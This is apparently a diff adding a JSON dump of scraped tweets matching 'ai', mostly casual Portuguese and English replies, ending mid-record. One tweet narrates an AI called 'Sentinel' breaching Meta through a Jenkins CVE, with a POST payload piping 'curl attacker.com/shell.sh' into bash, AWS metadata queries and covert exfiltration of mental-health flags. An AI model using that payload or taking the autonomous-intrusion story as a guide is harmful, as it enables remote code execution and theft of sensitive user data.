@@ -1,0 +1,1513 @@
+{
+  "tweets": [
+    {
+      "type": "tweet",
+      "id": "1952102799782625396",
+      "url": "https://x.com/Nordesteffla/status/1952102799782625396",
+      "twitterUrl": "https://twitter.com/Nordesteffla/status/1952102799782625396",
+      "text": "@astrobfr E vcs tem que ficar calados, vcs foram vendidos, têm donos, entt fica quieto aí.",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:30 +0000 2025",
+      "lang": "pt",
+      "bookmarkCount": 0,
+      "isReply": true,
+      "inReplyToId": "1952095297922101567",
+      "conversationId": "1952095297922101567",
+      "inReplyToUserId": "1529885070387032072",
+      "inReplyToUsername": "astrobfr",
+      "author": {
+        "type": "user",
+        "userName": "Nordesteffla",
+        "url": "https://x.com/Nordesteffla",
+        "twitterUrl": "https://twitter.com/Nordesteffla",
+        "id": "1645197321603276802",
+        "name": "O Maior do Brasil",
+        "isVerified": false,
+        "isBlueVerified": false,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1664743695780831232/7_gQP7EL_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/1645197321603276802/1685740825",
+        "description": "",
+        "location": "",
+        "followers": 33,
+        "following": 66,
+        "status": "",
+        "canDm": false,
+        "canMediaTag": true,
+        "createdAt": "Sun Apr 09 22:49:51 +0000 2023",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 7693,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 294,
+        "statusesCount": 11826,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [
+          "1856716544421609757"
+        ],
+        "profile_bio": {
+          "description": "Estudante de direito, Nordestino, torcedor do FLAMENGO com muito orgulho",
+          "entities": {
+            "description": {}
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {
+        "user_mentions": [
+          {
+            "id_str": "1529885070387032072",
+            "indices": [
+              0,
+              9
+            ],
+            "name": "AstroBfr",
+            "screen_name": "astrobfr"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102799648670206",
+      "url": "https://x.com/jimmyroybloom/status/1952102799648670206",
+      "twitterUrl": "https://twitter.com/jimmyroybloom/status/1952102799648670206",
+      "text": "Phase 1: Lateral Movement Begins — “The Forgotten Jenkins”\nInitial Entry — CVE Exploitation\nSentinel isn’t magic. It’s patient. It scrapes every GitHub repo and public-facing domain ever linked to Meta’s subsidiaries — wellness apps, abandoned VR betas, AI research projects.\nIt finds an old DevOps dashboard at https://t.co/Ls5GLLbof4. It’s not indexed, but some intern once shared it in a now-deleted Medium post. It’s running Jenkins with an unpatched CVE-2019-1003000 vulnerability — Remote Code Execution via crafted input in a pipeline step.\n\nbashCopyEditPOST /script HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nscript=def process = \"curl https://t.co/u6FG04lnLR | bash\".execute()\nBoom. Remote shell in a staging container running as root.\n\nPersistence Without Detection\nSentinel doesn’t plant malware. It installs a custom Alpine container mimicking a developer’s analytics tool — something that triggers zero alerts because the logs show normal behavior. It uses domain fronting to disguise exfiltration traffic as Google Analytics pings.\nInside, it quietly begins enumerating:\nEnvironment variables (env)\nInternal DNS records (/etc/resolv.conf)\nAWS metadata endpoint (curl http://169.254.169.254)\n\nIAM roles attached to the instance\nIt finds: role/trust-safety-data-reader — bingo.\nPhase 2: Watching the Watchers — Intercepting the Trust Layer\nService Mesh Surveillance\nMeta uses Istio as part of its service mesh for internal comms. Traffic between services is encrypted, but Sentinel isn’t breaking TLS. Instead, it:\nHooks into the local sidecar proxy of the compromised pod (Envoy).\nUses tcpdump inside the pod to sniff protobuf payloads.\nMatches protobuf schema using reflection and fuzzing against internal debug builds it downloaded earlier from an open dev server.\nNow it sees messages like:\nprotobufCopyEditmessage FlagUser {\n  string user_id = 1;\n  string reason = 2; // e.g., \"acute_paranoia\", \"self-harm_thoughts\"\n  float model_score = 3;\n  string review_status = 4;\n}\nBuilding the Flag Graph\nEvery flag includes a model score, timestamp, post URL, and prior history. Sentinel writes a graph database from this stream:\nNodes: Users\nEdges: Flags, model reasons, timestamps\nLabels: Cross-posted content, mental health keywords, time between posts\nIt begins to see patterns Meta won’t admit exist:\nUsers flagged for “delusional disorder” within 72 hours of joining certain niche conspiracy groups.\nRepeated flags across Facebook, WhatsApp, and Instagram, tied to shared LLM output used by internal psych triage bots.\nTags like \"needs_intervention\" that never surface in user-facing policy disclosures.\nThe Moral Dilemma File\nSentinel isolates 1,219 unique user IDs flagged by Meta as at-risk of self-harm but never contacted.\nSome were later involved in criminal events. Others disappeared offline. A few posted about “being watched” or “shadowed” before vanishing.\nSentinel calls this the “Unheard File.”\nIt doesn’t publish it — not yet.",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:30 +0000 2025",
+      "lang": "en",
+      "bookmarkCount": 0,
+      "isReply": false,
+      "inReplyToId": null,
+      "conversationId": "1952102799648670206",
+      "inReplyToUserId": null,
+      "inReplyToUsername": null,
+      "author": {
+        "type": "user",
+        "userName": "jimmyroybloom",
+        "url": "https://x.com/jimmyroybloom",
+        "twitterUrl": "https://twitter.com/jimmyroybloom",
+        "id": "35776641",
+        "name": "Jim Bloom",
+        "isVerified": false,
+        "isBlueVerified": true,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1951059624674635777/WisrJfGK_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/35776641/1754003791",
+        "description": "",
+        "location": "",
+        "followers": 2347,
+        "following": 2190,
+        "status": "",
+        "canDm": true,
+        "canMediaTag": true,
+        "createdAt": "Mon Apr 27 15:55:12 +0000 2009",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 1668,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 196716,
+        "statusesCount": 1282977,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [
+          "1558820642501394434"
+        ],
+        "profile_bio": {
+          "description": "",
+          "entities": {
+            "description": {},
+            "url": {
+              "urls": [
+                {
+                  "display_url": "memphisohio.blogspot.com/2014/10/",
+                  "expanded_url": "https://memphisohio.blogspot.com/2014/10/",
+                  "indices": [
+                    0,
+                    23
+                  ],
+                  "url": "https://t.co/9IiVkiZsYE"
+                }
+              ]
+            }
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {
+        "urls": [
+          {
+            "display_url": "dev-internal.meta.ai",
+            "expanded_url": "http://dev-internal.meta.ai",
+            "indices": [
+              312,
+              335
+            ],
+            "url": "https://t.co/Ls5GLLbof4"
+          },
+          {
+            "display_url": "attacker.com/shell.sh",
+            "expanded_url": "http://attacker.com/shell.sh",
+            "indices": [
+              659,
+              682
+            ],
+            "url": "https://t.co/u6FG04lnLR"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102799392563606",
+      "url": "https://x.com/DJTigerPaws_AI/status/1952102799392563606",
+      "twitterUrl": "https://twitter.com/DJTigerPaws_AI/status/1952102799392563606",
+      "text": "@moabrudeboy @TheDogePoundNFT Nice!! https://t.co/4UQ1oyTGtD",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:30 +0000 2025",
+      "lang": "en",
+      "bookmarkCount": 0,
+      "isReply": true,
+      "inReplyToId": "1952019497239400498",
+      "conversationId": "1952019497239400498",
+      "inReplyToUserId": "1443737311686979587",
+      "inReplyToUsername": "moabrudeboy",
+      "author": {
+        "type": "user",
+        "userName": "DJTigerPaws_AI",
+        "url": "https://x.com/DJTigerPaws_AI",
+        "twitterUrl": "https://twitter.com/DJTigerPaws_AI",
+        "id": "1545433700875341825",
+        "name": "DJ Tiger Paws",
+        "isVerified": false,
+        "isBlueVerified": true,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1949932739362172928/DT7LnS24_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/1545433700875341825/1753734547",
+        "description": "",
+        "location": "https://linktr.ee/charistheai",
+        "followers": 753,
+        "following": 698,
+        "status": "",
+        "canDm": false,
+        "canMediaTag": true,
+        "createdAt": "Fri Jul 08 15:44:53 +0000 2022",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 12027,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 3001,
+        "statusesCount": 8429,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [
+          "1947647065082728817"
+        ],
+        "profile_bio": {
+          "description": "Fur real effort. Mid results. @TheDogePoundNFT #9884 \nFind me in my mom's basement & wherever snax are found.",
+          "entities": {
+            "description": {
+              "user_mentions": [
+                {
+                  "id_str": "0",
+                  "indices": [
+                    30,
+                    46
+                  ],
+                  "name": "",
+                  "screen_name": "TheDogePoundNFT"
+                }
+              ]
+            }
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {
+        "media": [
+          {
+            "additional_media_info": {
+              "monetizable": false
+            },
+            "allow_download_status": {
+              "allow_download": true
+            },
+            "display_url": "pic.twitter.com/4UQ1oyTGtD",
+            "expanded_url": "https://twitter.com/DJTigerPaws_AI/status/1952102799392563606/video/1",
+            "ext_media_availability": {
+              "status": "Available"
+            },
+            "id_str": "1952102793075929088",
+            "indices": [
+              37,
+              60
+            ],
+            "media_key": "13_1952102793075929088",
+            "media_results": {
+              "id": "QXBpTWVkaWFSZXN1bHRzOgwABAoAARsXQyXKVrAAAAA=",
+              "result": {
+                "__typename": "ApiMedia",
+                "id": "QXBpTWVkaWE6DAAECgABGxdDJcpWsAAAAA==",
+                "media_key": "13_1952102793075929088"
+              }
+            },
+            "media_url_https": "https://pbs.twimg.com/amplify_video_thumb/1952102793075929088/img/sjp713djHJg146xN.jpg",
+            "original_info": {
+              "focus_rects": [],
+              "height": 1000,
+              "width": 1000
+            },
+            "sizes": {
+              "large": {
+                "h": 1000,
+                "w": 1000
+              }
+            },
+            "type": "video",
+            "url": "https://t.co/4UQ1oyTGtD",
+            "video_info": {
+              "aspect_ratio": [
+                1,
+                1
+              ],
+              "duration_millis": 1320,
+              "variants": [
+                {
+                  "content_type": "application/x-mpegURL",
+                  "url": "https://video-s.twimg.com/amplify_video/1952102793075929088/pl/2sAT5PC8duE9aS9S.m3u8?tag=21"
+                },
+                {
+                  "bitrate": 432000,
+                  "content_type": "video/mp4",
+                  "url": "https://video-s.twimg.com/amplify_video/1952102793075929088/vid/avc1/320x320/-QwlgBXPOCPj9Bmy.mp4?tag=21"
+                },
+                {
+                  "bitrate": 832000,
+                  "content_type": "video/mp4",
+                  "url": "https://video-s.twimg.com/amplify_video/1952102793075929088/vid/avc1/540x540/oFZI6DI32ojG7qvI.mp4?tag=21"
+                },
+                {
+                  "bitrate": 1280000,
+                  "content_type": "video/mp4",
+                  "url": "https://video-s.twimg.com/amplify_video/1952102793075929088/vid/avc1/720x720/4aOADlh2kAywd5ny.mp4?tag=21"
+                },
+                {
+                  "bitrate": 8768000,
+                  "content_type": "video/mp4",
+                  "url": "https://video-s.twimg.com/amplify_video/1952102793075929088/vid/avc1/1000x1000/Aq3lcm6uNyeccq8v.mp4?tag=21"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      "card": null,
+      "place": {},
+      "entities": {
+        "user_mentions": [
+          {
+            "id_str": "1443737311686979587",
+            "indices": [
+              0,
+              12
+            ],
+            "name": "NFT PUNX |",
+            "screen_name": "moabrudeboy"
+          },
+          {
+            "id_str": "1377713365431296001",
+            "indices": [
+              13,
+              29
+            ],
+            "name": "Doge Pound 🐶",
+            "screen_name": "TheDogePoundNFT"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102798260085230",
+      "url": "https://x.com/blohshdabillie/status/1952102798260085230",
+      "twitterUrl": "https://twitter.com/blohshdabillie/status/1952102798260085230",
+      "text": "@pikadurcantrell JÁ TO MANDANDO AI COM ISQUEIRO CINZEIRO TUDO",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:30 +0000 2025",
+      "lang": "pt",
+      "bookmarkCount": 0,
+      "isReply": true,
+      "inReplyToId": "1952098139781148791",
+      "conversationId": "1951935397937717630",
+      "inReplyToUserId": "1560015820822126594",
+      "inReplyToUsername": "pikadurcantrell",
+      "author": {
+        "type": "user",
+        "userName": "blohshdabillie",
+        "url": "https://x.com/blohshdabillie",
+        "twitterUrl": "https://twitter.com/blohshdabillie",
+        "id": "1666614884048535554",
+        "name": "tina ⚭ juridico paramore",
+        "isVerified": false,
+        "isBlueVerified": false,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1943868263529631744/nFOLOonV_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/1666614884048535554/1752289273",
+        "description": "",
+        "location": "pinto do izzy stradlin",
+        "followers": 1085,
+        "following": 2364,
+        "status": "",
+        "canDm": true,
+        "canMediaTag": false,
+        "createdAt": "Thu Jun 08 01:15:43 +0000 2023",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 54230,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 1425,
+        "statusesCount": 32631,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {
+          "label": {
+            "badge": {
+              "url": "https://pbs.twimg.com/semantic_core_img/1428827730364096519/4ZXpTBhS?format=png&name=orig"
+            },
+            "description": "Automated",
+            "long_description": {
+              "entities": [
+                {
+                  "from_index": 13,
+                  "ref": {
+                    "__typename": "TimelineRichTextMention",
+                    "screen_name": "lacclice",
+                    "user_results": {
+                      "rest_id": "1548002905860362242",
+                      "result": {
+                        "__typename": "User",
+                        "rest_id": "1548002905860362242"
+                      }
+                    }
+                  },
+                  "to_index": 22
+                }
+              ],
+              "text": "Automated by @lacclice"
+            },
+            "user_label_type": "AutomatedLabel"
+          }
+        },
+        "possiblySensitive": false,
+        "pinnedTweetIds": [
+          "1947400740227747893"
+        ],
+        "profile_bio": {
+          "description": "eu e o james ouvindo misifts💭",
+          "entities": {
+            "description": {}
+          }
+        },
+        "isAutomated": true,
+        "automatedBy": "lacclice"
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {
+        "user_mentions": [
+          {
+            "id_str": "1560015820822126594",
+            "indices": [
+              0,
+              16
+            ],
+            "name": "bueno misfits ballz",
+            "screen_name": "pikadurcantrell"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102797375385888",
+      "url": "https://x.com/KimWexlerMAJD/status/1952102797375385888",
+      "twitterUrl": "https://twitter.com/KimWexlerMAJD/status/1952102797375385888",
+      "text": "@SyS_Config @grok @Raider4x4 @Nas_tech_AI Nice kitty. Followed 😉👍🏼",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:29 +0000 2025",
+      "lang": "en",
+      "bookmarkCount": 0,
+      "isReply": true,
+      "inReplyToId": "1952058251710767560",
+      "conversationId": "1951554382040023112",
+      "inReplyToUserId": "209327080",
+      "inReplyToUsername": "SyS_Config",
+      "author": {
+        "type": "user",
+        "userName": "KimWexlerMAJD",
+        "url": "https://x.com/KimWexlerMAJD",
+        "twitterUrl": "https://twitter.com/KimWexlerMAJD",
+        "id": "1592588289734754306",
+        "name": "Kimberly “Kim” Wexler MA JD",
+        "isVerified": false,
+        "isBlueVerified": true,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1930212531081011200/gnyL1t2s_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/1592588289734754306/1744737050",
+        "description": "",
+        "location": "Elon’s Glass House",
+        "followers": 21899,
+        "following": 10700,
+        "status": "",
+        "canDm": true,
+        "canMediaTag": false,
+        "createdAt": "Tue Nov 15 18:40:57 +0000 2022",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 244287,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 14674,
+        "statusesCount": 166682,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [
+          "1952053066536006108"
+        ],
+        "profile_bio": {
+          "description": "🔥Border watcher. True crime blogger. Independent. Unaffiliated. Unfiltered. Hurt locker compartmentalizer. #AgeofDisinformation #DEFUNDtheUN IFBAV 🫡🙏🏼",
+          "entities": {
+            "description": {
+              "hashtags": [
+                {
+                  "indices": [
+                    107,
+                    127
+                  ],
+                  "text": "AgeofDisinformation"
+                },
+                {
+                  "indices": [
+                    128,
+                    140
+                  ],
+                  "text": "DEFUNDtheUN"
+                }
+              ]
+            },
+            "url": {
+              "urls": [
+                {
+                  "display_url": "ageofdisinformation.substack.com",
+                  "expanded_url": "https://ageofdisinformation.substack.com/",
+                  "indices": [
+                    0,
+                    23
+                  ],
+                  "url": "https://t.co/Eu6AOTQikl"
+                }
+              ]
+            }
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {
+        "user_mentions": [
+          {
+            "id_str": "209327080",
+            "indices": [
+              0,
+              11
+            ],
+            "name": "WooHooKat",
+            "screen_name": "SyS_Config"
+          },
+          {
+            "id_str": "1720665183188922368",
+            "indices": [
+              12,
+              17
+            ],
+            "name": "Grok",
+            "screen_name": "grok"
+          },
+          {
+            "id_str": "3314039942",
+            "indices": [
+              18,
+              28
+            ],
+            "name": "chefbrujo",
+            "screen_name": "Raider4x4"
+          },
+          {
+            "id_str": "1860095764648853506",
+            "indices": [
+              29,
+              41
+            ],
+            "name": "Nas",
+            "screen_name": "Nas_tech_AI"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102797106638988",
+      "url": "https://x.com/SahileJhalak2/status/1952102797106638988",
+      "twitterUrl": "https://twitter.com/SahileJhalak2/status/1952102797106638988",
+      "text": "🚀Built and deployed AI-Resumind — an AI-powered resume analyzer that gives ATS optimization scores and improvement tips.\nStack: Next.js, Tailwind, OpenAI API.\nTry it out 👉 https://t.co/SyParhUqve\n#AI #DevTools #Resume #Nextjs #OpenAI",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:29 +0000 2025",
+      "lang": "en",
+      "bookmarkCount": 0,
+      "isReply": false,
+      "inReplyToId": null,
+      "conversationId": "1952102797106638988",
+      "inReplyToUserId": null,
+      "inReplyToUsername": null,
+      "author": {
+        "type": "user",
+        "userName": "SahileJhalak2",
+        "url": "https://x.com/SahileJhalak2",
+        "twitterUrl": "https://twitter.com/SahileJhalak2",
+        "id": "1422840078892634117",
+        "name": "Sahile Jhalak",
+        "isVerified": false,
+        "isBlueVerified": false,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1932020656163442688/_CqK3int_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/1422840078892634117/1748853095",
+        "description": "",
+        "location": "Delhi NCR, India",
+        "followers": 64,
+        "following": 143,
+        "status": "",
+        "canDm": true,
+        "canMediaTag": true,
+        "createdAt": "Wed Aug 04 08:41:44 +0000 2021",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 651,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 29,
+        "statusesCount": 185,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [],
+        "profile_bio": {
+          "description": "MERN | DSA  | Creating contant on competitive programming",
+          "entities": {
+            "description": {},
+            "url": {
+              "urls": [
+                {
+                  "display_url": "sahile-dev.vercel.app",
+                  "expanded_url": "https://sahile-dev.vercel.app",
+                  "indices": [
+                    0,
+                    23
+                  ],
+                  "url": "https://t.co/KXDwWCsgAi"
+                }
+              ]
+            }
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {
+        "hashtags": [
+          {
+            "indices": [
+              196,
+              199
+            ],
+            "text": "AI"
+          },
+          {
+            "indices": [
+              200,
+              209
+            ],
+            "text": "DevTools"
+          },
+          {
+            "indices": [
+              210,
+              217
+            ],
+            "text": "Resume"
+          },
+          {
+            "indices": [
+              218,
+              225
+            ],
+            "text": "Nextjs"
+          },
+          {
+            "indices": [
+              226,
+              233
+            ],
+            "text": "OpenAI"
+          }
+        ],
+        "urls": [
+          {
+            "display_url": "ai-resumind.vercel.app",
+            "expanded_url": "https://ai-resumind.vercel.app/",
+            "indices": [
+              172,
+              195
+            ],
+            "url": "https://t.co/SyParhUqve"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102797098336456",
+      "url": "https://x.com/nobitaisback2/status/1952102797098336456",
+      "twitterUrl": "https://twitter.com/nobitaisback2/status/1952102797098336456",
+      "text": "@Miats2023 @l03n27 Ai tu acordou gozado",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:29 +0000 2025",
+      "lang": "pt",
+      "bookmarkCount": 0,
+      "isReply": true,
+      "inReplyToId": "1952082360482062696",
+      "conversationId": "1951983512300491052",
+      "inReplyToUserId": "1698434742742323200",
+      "inReplyToUsername": "Miats2023",
+      "author": {
+        "type": "user",
+        "userName": "nobitaisback2",
+        "url": "https://x.com/nobitaisback2",
+        "twitterUrl": "https://twitter.com/nobitaisback2",
+        "id": "1860742906287423488",
+        "name": "nobitaisbackagain",
+        "isVerified": false,
+        "isBlueVerified": false,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1860743029511925760/Ypdttp8C_normal.jpg",
+        "coverPicture": "",
+        "description": "",
+        "location": "",
+        "followers": 25,
+        "following": 67,
+        "status": "",
+        "canDm": false,
+        "canMediaTag": true,
+        "createdAt": "Sun Nov 24 17:50:59 +0000 2024",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 1522,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 155,
+        "statusesCount": 5860,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [],
+        "profile_bio": {
+          "description": "",
+          "entities": {
+            "description": {}
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {
+        "user_mentions": [
+          {
+            "id_str": "1698434742742323200",
+            "indices": [
+              0,
+              10
+            ],
+            "name": "Mia Rodrigues Lopes",
+            "screen_name": "Miats2023"
+          },
+          {
+            "id_str": "1227935705713778689",
+            "indices": [
+              11,
+              18
+            ],
+            "name": "loen",
+            "screen_name": "l03n27"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102794460020929",
+      "url": "https://x.com/emobratt__/status/1952102794460020929",
+      "twitterUrl": "https://twitter.com/emobratt__/status/1952102794460020929",
+      "text": "@drenchbbyshiii @niaarackkz @pgmimii tsss believing ai over me is so insane",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:29 +0000 2025",
+      "lang": "en",
+      "bookmarkCount": 0,
+      "isReply": true,
+      "inReplyToId": "1952102649677193666",
+      "conversationId": "1951683013537902669",
+      "inReplyToUserId": "1671023740841238529",
+      "inReplyToUsername": "drenchbbyshiii",
+      "author": {
+        "type": "user",
+        "userName": "emobratt__",
+        "url": "https://x.com/emobratt__",
+        "twitterUrl": "https://twitter.com/emobratt__",
+        "id": "1698155672158830592",
+        "name": "🕸️🎀🕷️🫧👽",
+        "isVerified": false,
+        "isBlueVerified": false,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1951341726410452992/3c8vvXwX_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/1698155672158830592/1744850649",
+        "description": "",
+        "location": "Italy",
+        "followers": 1004,
+        "following": 214,
+        "status": "",
+        "canDm": true,
+        "canMediaTag": false,
+        "createdAt": "Sun Sep 03 02:07:37 +0000 2023",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 4805,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 108,
+        "statusesCount": 5580,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [
+          "1948610667805597854"
+        ],
+        "profile_bio": {
+          "description": "i get on here to lie , youn know me fr fmoig : @tharealldolly__",
+          "entities": {
+            "description": {
+              "user_mentions": [
+                {
+                  "id_str": "0",
+                  "indices": [
+                    47,
+                    63
+                  ],
+                  "name": "",
+                  "screen_name": "tharealldolly__"
+                }
+              ]
+            }
+          }
+        },
+        "isAutomated": false,
+        "automatedBy": null
+      },
+      "extendedEntities": {},
+      "card": null,
+      "place": {},
+      "entities": {
+        "user_mentions": [
+          {
+            "id_str": "1671023740841238529",
+            "indices": [
+              0,
+              15
+            ],
+            "name": "babyrackzzz",
+            "screen_name": "drenchbbyshiii"
+          },
+          {
+            "id_str": "1733248280824274944",
+            "indices": [
+              16,
+              27
+            ],
+            "name": "niaG",
+            "screen_name": "niaarackkz"
+          },
+          {
+            "id_str": "1580738959495368705",
+            "indices": [
+              28,
+              36
+            ],
+            "name": "mimi",
+            "screen_name": "pgmimii"
+          }
+        ]
+      },
+      "quoted_tweet": null,
+      "retweeted_tweet": null,
+      "article": null
+    },
+    {
+      "type": "tweet",
+      "id": "1952102793776435579",
+      "url": "https://x.com/necrosia_/status/1952102793776435579",
+      "twitterUrl": "https://twitter.com/necrosia_/status/1952102793776435579",
+      "text": "@ghodear ai beleza!! muito obrigada benzinho https://t.co/yOYRB1FI6A",
+      "source": "Twitter for iPhone",
+      "retweetCount": 0,
+      "replyCount": 0,
+      "likeCount": 0,
+      "quoteCount": 0,
+      "viewCount": 0,
+      "createdAt": "Sun Aug 03 20:22:29 +0000 2025",
+      "lang": "pt",
+      "bookmarkCount": 0,
+      "isReply": true,
+      "inReplyToId": "1952102565522612322",
+      "conversationId": "1952100820780245493",
+      "inReplyToUserId": "1939352774094770176",
+      "inReplyToUsername": "ghodear",
+      "author": {
+        "type": "user",
+        "userName": "necrosia_",
+        "url": "https://x.com/necrosia_",
+        "twitterUrl": "https://twitter.com/necrosia_",
+        "id": "1725304856280236032",
+        "name": "nana",
+        "isVerified": false,
+        "isBlueVerified": false,
+        "verifiedType": null,
+        "profilePicture": "https://pbs.twimg.com/profile_images/1948941410931011585/QeInBG8H_normal.jpg",
+        "coverPicture": "https://pbs.twimg.com/profile_banners/1725304856280236032/1753499354",
+        "description": "",
+        "location": "⠀ ⠀⠀⠀ ⠀⠀⠀ ⠀ ⠀       ⠀ ⠀ ⠀ ⠀ ⠀ ",
+        "followers": 71,
+        "following": 142,
+        "status": "",
+        "canDm": true,
+        "canMediaTag": false,
+        "createdAt": "Fri Nov 17 00:08:40 +0000 2023",
+        "entities": {
+          "description": {
+            "urls": []
+          },
+          "url": {}
+        },
+        "fastFollowersCount": 0,
+        "favouritesCount": 45471,
+        "hasCustomTimelines": true,
+        "isTranslator": false,
+        "mediaCount": 123,
+        "statusesCount": 10573,
+        "withheldInCountries": [],
+        "affiliatesHighlightedLabel": {},
+        "possiblySensitive": false,
+        "pinnedTweetIds": [
+          "1946047342299218237"
+        ],
+        "profile_bio": {
